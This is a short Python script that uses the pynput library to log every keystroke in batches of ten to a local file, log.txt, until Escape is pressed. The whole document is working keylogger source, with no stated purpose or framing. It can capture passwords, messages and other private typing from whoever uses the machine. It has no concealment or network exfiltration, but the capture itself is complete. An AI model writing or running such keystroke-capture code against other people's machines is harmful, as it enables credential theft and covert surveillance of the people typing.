import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []
emp = False

def on_press(key):
    global keys, count
    keys.append(key)
    count+=1

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    global emp
    with open("log.txt","a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                if not emp:
                    f.write("\n")
                    emp = True
            elif k.find("Key") == -1:
                f.write(k)
                emp = False

def on_release(key):
    if key==Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

